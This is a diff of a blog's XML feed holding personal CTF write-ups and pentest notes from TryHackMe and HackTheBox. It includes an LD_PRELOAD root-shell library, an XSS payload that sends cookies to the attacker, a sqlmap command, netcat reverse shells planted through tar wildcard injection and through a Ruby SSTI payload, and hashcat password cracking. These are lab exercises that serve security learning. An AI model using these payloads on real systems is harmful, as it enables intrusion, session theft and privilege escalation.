-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I learned these from <a href="https://tryhackme.com/room/road">Road on TryHackMe</a> today  </p>
-<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="Mongo-DB"><a href="#Mongo-DB" class="headerlink" title="Mongo DB"></a>Mongo DB</h3><p>It usually runs on port <code>27017</code>  </p>
-<h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads(?):"></a>payloads(?):</h4><p><strong>Look for working services</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
-<p><strong>MongoDB</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*show databases*/</span><br><span class="line">show db</span><br><span class="line">/*switch to a database*/</span><br><span class="line">use backup # In case the db name is backup</span><br><span class="line">/*list tables*/</span><br><span class="line">show collections</span><br><span class="line">/*read contents in a table*/</span><br><span class="line">db.user.find() # In case the table name is user</span><br></pre></td></tr></table></figure>
-
-<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>LD_PRELOAD is a function allows any program to share libraries.  </p>
-<h4 id="payloads-1"><a href="#payloads-1" class="headerlink" title="payloads:"></a>payloads:</h4><p><strong>shell.c</strong>  </p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line"> unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>library compilation</strong><br><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br><strong>add LD_PRELOAD with sudo</strong><br><code>sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility</code><br>In case of sudo result like this:<br><img src="https://hackmd.io/_uploads/ByMeS7GHa.png" alt="image">  </p>
-<p><code>env_keep+=LD_PRELOAD</code>  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>LD_PRELOAD</tag>
-        <tag>MongoDB</tag>
       </tags>
   </entry>
   <entry>
@@ -1999,39 +1999,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>john</tag>
         <tag>substitution cipher</tag>
         <tag>Classical cipher</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>The Marketplace CTF Writeup on TryHackMe</title>
-    <url>/2023/11/22/marketplacectf/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Coffee or tea or whale?<br>well…you can’t order the last one 🤣  </p>
-<p>Victim IP : 10.10.65.93<br>My IP : 10.8.211.34  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p>Nothing found but a port : 32768 with the same function as port : 80.  </p>
-<h3 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h3><p>This is a simple market website, you can register your account and add new items.  </p>
-<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>After I tried out the <code>add</code> function, I noticed that there’s a XSS vulnerabilities:<br><img src="https://hackmd.io/_uploads/S1kEuSjVp.png" alt="image"><br>Both of the alert worked, so it’s time to report the payload to admin.<br>Though there’s no webhook.site to use, it’s still feasible to set up a simple http server with python.<br><strong>Source:</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># POC for cookie stealing through XSS</span></span><br><span class="line"><span class="comment"># Should work with:</span></span><br><span class="line"><span class="comment"># &lt;script&gt;</span></span><br><span class="line"><span class="comment">#   image = new Image();</span></span><br><span class="line"><span class="comment">#   image.src=&#x27;http://X.X.X.X:8888/?&#x27;+document.cookie;</span></span><br><span class="line"><span class="comment"># &lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Written by Ahmed Shawky @lnxg33k</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        query_components = parse_qs(urlparse(self.path).query)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;%s - %s\t%s&quot;</span> % (</span><br><span class="line">            datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %I:%M %p&quot;</span>),</span><br><span class="line">            self.client_address[<span class="number">0</span>],</span><br><span class="line">            self.headers[<span class="string">&#x27;user-agent&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;-------------------&quot;</span>*<span class="number">6</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> query_components.items():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;%s\t\t\t%s&quot;</span> % (k.strip(), v)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print query_components</span></span><br><span class="line">        <span class="comment"># self.send_response(500)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)</span></span><br><span class="line">        <span class="comment"># self.end_headers()</span></span><br><span class="line">        <span class="comment"># self.wfile.write(c)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>), MyHandler)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Started http server&#x27;</span>)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;^C received, shutting down server&#x27;</span>)</span><br><span class="line">        server.socket.close()</span><br></pre></td></tr></table></figure>
-<p><strong>XSS Payload:</strong>  </p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> image = <span class="keyword">new</span> <span class="title class_">Image</span>(); image.<span class="property">src</span>=<span class="string">&#x27;http://10.8.211.34:8888/?&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJc_KBiEp.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkvYYSiNa.png" alt="image">  </p>
-<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><p>After getting the admin’s cookie, I found out a sql injection in admin panel.<br><img src="https://hackmd.io/_uploads/S1UQcHsVp.png" alt="image">  </p>
-<p><strong>sqlmap:</strong><br><code>sqlmap --url &quot;http://10.10.65.93/admin?user=1&quot; --cookie=&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDA2MjkxMDN9.Lj9L2zuNLSAQE3btbfm_XZTgbJHKRPH7HOWk-fSbgyE&#39; --technique=U --delay=2 --dump</code><br><img src="https://hackmd.io/_uploads/SJTecSiNa.png" alt="image">  </p>
-<p>And here’s the ssh password~  </p>
-<p><img src="https://hackmd.io/_uploads/SJOr9Ss46.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/r1gUcSoNT.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Wildcard-Injection"><a href="#Wildcard-Injection" class="headerlink" title="Wildcard Injection"></a>Wildcard Injection</h4><p>Here for more informations:<a href="https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c">link</a>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.211.34 5130 &gt;/tmp/f&#x27;</span>&gt;shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;<span class="string">&#x27;--checkpoint-action=exec=sh shell.sh&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;--checkpoint=1</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/ry3esSs4a.png" alt="image">  </p>
-<p>Get shell on 5130:<br><img src="https://hackmd.io/_uploads/H1UEoBi46.png" alt="image"><br>Escalated to user <code>michael</code>.  </p>
-<h4 id="Docker-Escalation"><a href="#Docker-Escalation" class="headerlink" title="Docker Escalation"></a>Docker Escalation</h4><p><a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a><br><img src="https://hackmd.io/_uploads/rkvdsroE6.png" alt="image"><br>Get flag!!!<br><img src="https://hackmd.io/_uploads/HJfiiBjV6.png" alt="image">  </p>
-<h3 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h3><p>Just a little bit tire and nervous now &gt;&lt;.  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>XSS</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>SQL Injection</tag>
-        <tag>Wildcard Injection</tag>
       </tags>
   </entry>
   <entry>
@@ -2119,6 +2086,39 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>loTuX CTF</tag>
         <tag>RCE</tag>
         <tag>backdoor</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>The Marketplace CTF Writeup on TryHackMe</title>
+    <url>/2023/11/22/marketplacectf/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Coffee or tea or whale?<br>well…you can’t order the last one 🤣  </p>
+<p>Victim IP : 10.10.65.93<br>My IP : 10.8.211.34  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p>Nothing found but a port : 32768 with the same function as port : 80.  </p>
+<h3 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h3><p>This is a simple market website, you can register your account and add new items.  </p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>After I tried out the <code>add</code> function, I noticed that there’s a XSS vulnerabilities:<br><img src="https://hackmd.io/_uploads/S1kEuSjVp.png" alt="image"><br>Both of the alert worked, so it’s time to report the payload to admin.<br>Though there’s no webhook.site to use, it’s still feasible to set up a simple http server with python.<br><strong>Source:</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># POC for cookie stealing through XSS</span></span><br><span class="line"><span class="comment"># Should work with:</span></span><br><span class="line"><span class="comment"># &lt;script&gt;</span></span><br><span class="line"><span class="comment">#   image = new Image();</span></span><br><span class="line"><span class="comment">#   image.src=&#x27;http://X.X.X.X:8888/?&#x27;+document.cookie;</span></span><br><span class="line"><span class="comment"># &lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Written by Ahmed Shawky @lnxg33k</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        query_components = parse_qs(urlparse(self.path).query)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;%s - %s\t%s&quot;</span> % (</span><br><span class="line">            datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %I:%M %p&quot;</span>),</span><br><span class="line">            self.client_address[<span class="number">0</span>],</span><br><span class="line">            self.headers[<span class="string">&#x27;user-agent&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;-------------------&quot;</span>*<span class="number">6</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> query_components.items():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;%s\t\t\t%s&quot;</span> % (k.strip(), v)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print query_components</span></span><br><span class="line">        <span class="comment"># self.send_response(500)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)</span></span><br><span class="line">        <span class="comment"># self.end_headers()</span></span><br><span class="line">        <span class="comment"># self.wfile.write(c)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>), MyHandler)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Started http server&#x27;</span>)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;^C received, shutting down server&#x27;</span>)</span><br><span class="line">        server.socket.close()</span><br></pre></td></tr></table></figure>
+<p><strong>XSS Payload:</strong>  </p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> image = <span class="keyword">new</span> <span class="title class_">Image</span>(); image.<span class="property">src</span>=<span class="string">&#x27;http://10.8.211.34:8888/?&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJc_KBiEp.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkvYYSiNa.png" alt="image">  </p>
+<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><p>After getting the admin’s cookie, I found out a sql injection in admin panel.<br><img src="https://hackmd.io/_uploads/S1UQcHsVp.png" alt="image">  </p>
+<p><strong>sqlmap:</strong><br><code>sqlmap --url &quot;http://10.10.65.93/admin?user=1&quot; --cookie=&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDA2MjkxMDN9.Lj9L2zuNLSAQE3btbfm_XZTgbJHKRPH7HOWk-fSbgyE&#39; --technique=U --delay=2 --dump</code><br><img src="https://hackmd.io/_uploads/SJTecSiNa.png" alt="image">  </p>
+<p>And here’s the ssh password~  </p>
+<p><img src="https://hackmd.io/_uploads/SJOr9Ss46.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/r1gUcSoNT.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Wildcard-Injection"><a href="#Wildcard-Injection" class="headerlink" title="Wildcard Injection"></a>Wildcard Injection</h4><p>Here for more informations:<a href="https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c">link</a>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.211.34 5130 &gt;/tmp/f&#x27;</span>&gt;shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;<span class="string">&#x27;--checkpoint-action=exec=sh shell.sh&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;--checkpoint=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/ry3esSs4a.png" alt="image">  </p>
+<p>Get shell on 5130:<br><img src="https://hackmd.io/_uploads/H1UEoBi46.png" alt="image"><br>Escalated to user <code>michael</code>.  </p>
+<h4 id="Docker-Escalation"><a href="#Docker-Escalation" class="headerlink" title="Docker Escalation"></a>Docker Escalation</h4><p><a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a><br><img src="https://hackmd.io/_uploads/rkvdsroE6.png" alt="image"><br>Get flag!!!<br><img src="https://hackmd.io/_uploads/HJfiiBjV6.png" alt="image">  </p>
+<h3 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h3><p>Just a little bit tire and nervous now &gt;&lt;.  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>XSS</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>SQL Injection</tag>
+        <tag>Wildcard Injection</tag>
       </tags>
   </entry>
   <entry>
@@ -2296,6 +2296,44 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Perfection Write Up on HackTheBox</title>
+    <url>/2024/04/07/perfection-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.253<br>卡在一開始的Ruby Rails的SSTI&#x3D; &#x3D;<br><del>菜，就多練</del>  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.253 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/rywbXqyg0.png" alt="image"><br>老樣子 &#x3D; &#x3D;  </p>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/S1id751eA.png" alt="image"><br>沒有什麼特別的東西…  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="web-exploitation"><a href="#web-exploitation" class="headerlink" title="web exploitation"></a>web exploitation</h4><p>在web的footer發現WEBrick 1.7.0的使用：<br><img src="https://hackmd.io/_uploads/BJoim91eA.png" alt="image"><br>合理推測是Ruby的網站  </p>
+<p>嘗試使用 exploit-db 上面關於WEBrick的CVE，不過都沒用  </p>
+<p><img src="https://hackmd.io/_uploads/Sy9xNqJlR.png" alt="image">  </p>
+<p>有個路徑<code>/weighted-grade-calc</code>，是一個簡單的分數加權計算程式  </p>
+<p><img src="https://hackmd.io/_uploads/rkJK49ylR.png" alt="image">  </p>
+<p>按下送出後的結果：  </p>
+<p><img src="https://hackmd.io/_uploads/HJzcEqkxR.png" alt="image">  </p>
+<p>嘗試使用COMMAND INJECTION之類的不過都無果，會有警告跳出來：  </p>
+<p><img src="https://hackmd.io/_uploads/r1jh491xR.png" alt="image">  </p>
+<p>然後我就卡住了 :D  </p>
+<p>最後偷喵了別人的write-up:<a href="https://medium.com/@andrewss112/hackthebox-perfection-49ab3e6ac224">https:&#x2F;&#x2F;medium.com&#x2F;@andrewss112&#x2F;hackthebox-perfection-49ab3e6ac224</a><br>原來要用 <code>%0A</code> 繞過檢查 + Ruby Rails SSTI啊!!!<br>Final Payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">category1=x%0A%3C%25%3D%20system%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.46%201004%20%3E%2Ftmp%2Ff%22%29%3B%20%25%3E&amp;grade1=100&amp;weight1=30&amp;category2=HACKING&amp;grade2=80&amp;weight2=10&amp;category3=thinking&amp;grade3=80&amp;weight3=10&amp;category4=meow&amp;grade4=97&amp;weight4=25&amp;category5=77&amp;grade5=77&amp;weight5=25</span><br></pre></td></tr></table></figure>
+<p>註：SSTI的payload：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%= system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.46 1004 &gt;/tmp/f&quot;); %&gt;</span><br></pre></td></tr></table></figure>
+<p>開彈reverse shell<br><img src="https://hackmd.io/_uploads/HkiFS9yxC.png" alt="image"><br>成功!!!  </p>
+<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>在本地port 8089架python http server<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8089</span><br></pre></td></tr></table></figure>
+<p>然後從機器抓小豌豆進去<br><img src="https://hackmd.io/_uploads/HyFzIckeA.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/H1UQI91gC.png" alt="image">  </p>
+<p><code>sudo</code>可以讓我打到變成root，所以要找到使用者密碼。<br>在本地有個檔案<code>Migration/pupilpath_credentials.db</code>，找到一個密碼，那很可能就是susan在機器上的密碼。<br><img src="https://hackmd.io/_uploads/r1Pq8c1x0.png" alt="image"><br>結合linpeas發現的可疑email檔案<img src="https://hackmd.io/_uploads/HJ6p8cyx0.png" alt="image"><br>找到密碼格式。<br><img src="https://hackmd.io/_uploads/HycRU9kxR.png" alt="image"><br>利用這些資訊配合hashcat進行密碼爆破：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat  -m 1400  pass -a 3 <span class="string">&#x27;susan_nasus_?d?d?d?d?d?d?d?d?d&#x27;</span> -t 64</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJczP9yxA.png" alt="image"><br>找到密碼<code>susan_nasus_413759210</code>！<br><img src="https://hackmd.io/_uploads/HJ04Oqyg0.png" alt="image"><br>最後成為<code>root</code>  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>我下午484應該挑一台Medium打打看(?)  </p>
+<p>附上比hashcat慢一點的python作法<br><img src="https://hackmd.io/_uploads/BJtPOq1gA.png" alt="image">  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>msfconsole Note</title>
     <url>/2023/12/13/msfconsole/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>While I was exploiting the <a href="https://tryhackme.com/room/blog"><strong>blog</strong></a> lab on Tryhackme today, I was unable to exploit the wordpress site with <code>cve 2019-8943</code> python poc, so I finally tried this out and succeeded.<br>There are still a lot of usage and methods I think, so  this post would be updated in future.  </p>
@@ -2333,44 +2371,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Note</tag>
         <tag>msfconsole</tag>
         <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Perfection Write Up on HackTheBox</title>
-    <url>/2024/04/07/perfection-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.253<br>卡在一開始的Ruby Rails的SSTI&#x3D; &#x3D;<br><del>菜，就多練</del>  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.253 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/rywbXqyg0.png" alt="image"><br>老樣子 &#x3D; &#x3D;  </p>
-<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/S1id751eA.png" alt="image"><br>沒有什麼特別的東西…  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="web-exploitation"><a href="#web-exploitation" class="headerlink" title="web exploitation"></a>web exploitation</h4><p>在web的footer發現WEBrick 1.7.0的使用：<br><img src="https://hackmd.io/_uploads/BJoim91eA.png" alt="image"><br>合理推測是Ruby的網站  </p>
-<p>嘗試使用 exploit-db 上面關於WEBrick的CVE，不過都沒用  </p>
-<p><img src="https://hackmd.io/_uploads/Sy9xNqJlR.png" alt="image">  </p>
-<p>有個路徑<code>/weighted-grade-calc</code>，是一個簡單的分數加權計算程式  </p>
-<p><img src="https://hackmd.io/_uploads/rkJK49ylR.png" alt="image">  </p>
-<p>按下送出後的結果：  </p>
-<p><img src="https://hackmd.io/_uploads/HJzcEqkxR.png" alt="image">  </p>
-<p>嘗試使用COMMAND INJECTION之類的不過都無果，會有警告跳出來：  </p>
-<p><img src="https://hackmd.io/_uploads/r1jh491xR.png" alt="image">  </p>
-<p>然後我就卡住了 :D  </p>
-<p>最後偷喵了別人的write-up:<a href="https://medium.com/@andrewss112/hackthebox-perfection-49ab3e6ac224">https:&#x2F;&#x2F;medium.com&#x2F;@andrewss112&#x2F;hackthebox-perfection-49ab3e6ac224</a><br>原來要用 <code>%0A</code> 繞過檢查 + Ruby Rails SSTI啊!!!<br>Final Payload:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">category1=x%0A%3C%25%3D%20system%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.46%201004%20%3E%2Ftmp%2Ff%22%29%3B%20%25%3E&amp;grade1=100&amp;weight1=30&amp;category2=HACKING&amp;grade2=80&amp;weight2=10&amp;category3=thinking&amp;grade3=80&amp;weight3=10&amp;category4=meow&amp;grade4=97&amp;weight4=25&amp;category5=77&amp;grade5=77&amp;weight5=25</span><br></pre></td></tr></table></figure>
-<p>註：SSTI的payload：  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%= system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.46 1004 &gt;/tmp/f&quot;); %&gt;</span><br></pre></td></tr></table></figure>
